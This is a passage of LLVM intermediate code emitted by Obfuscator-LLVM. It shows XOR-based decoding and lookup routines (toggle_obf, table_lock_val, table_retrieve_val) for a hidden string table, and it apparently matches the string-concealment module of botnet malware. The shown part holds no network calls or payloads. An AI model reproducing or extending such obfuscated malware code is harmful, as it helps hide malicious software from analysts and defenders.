  %109 = and i32 -1184007516, %108
  %110 = xor i32 -1184007516, -1
  %111 = and i32 %107, %110
  %112 = xor i32 %99, -1
  %113 = and i32 %112, -1184007516
  %114 = and i32 %99, %110
  %115 = or i32 %109, %111
  %116 = or i32 %113, %114
  %117 = xor i32 %115, %116
  %118 = xor i32 %107, %99
  %119 = trunc i32 %117 to i8
  store i8 %119, i8* %105, align 1
  %120 = load i8, i8* %8, align 1
  %121 = zext i8 %120 to i32
  %122 = load %struct.table_value*, %struct.table_value** %4, align 8
  %123 = getelementptr inbounds %struct.table_value, %struct.table_value* %122, i32 0, i32 0
  %124 = load i8*, i8** %123, align 8
  %125 = load i32, i32* %3, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds i8, i8* %124, i64 %126
  %128 = load i8, i8* %127, align 1
  %129 = sext i8 %128 to i32
  %130 = xor i32 %129, -1
  %131 = and i32 -1137641293, %130
  %132 = xor i32 -1137641293, -1
  %133 = and i32 %129, %132
  %134 = xor i32 %121, -1
  %135 = and i32 %134, -1137641293
  %136 = and i32 %121, %132
  %137 = or i32 %131, %133
  %138 = or i32 %135, %136
  %139 = xor i32 %137, %138
  %140 = xor i32 %129, %121
  %141 = trunc i32 %139 to i8
  store i8 %141, i8* %127, align 1
  br label %142

; <label>:142:                                    ; preds = %58
  %143 = load i32, i32* %3, align 4
  %144 = sub i32 0, %143
  %145 = sub i32 0, 1
  %146 = add i32 %144, %145
  %147 = sub i32 0, %146
  %148 = add nsw i32 %143, 1
  store i32 %147, i32* %3, align 4
  br label %51

; <label>:149:                                    ; preds = %51
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
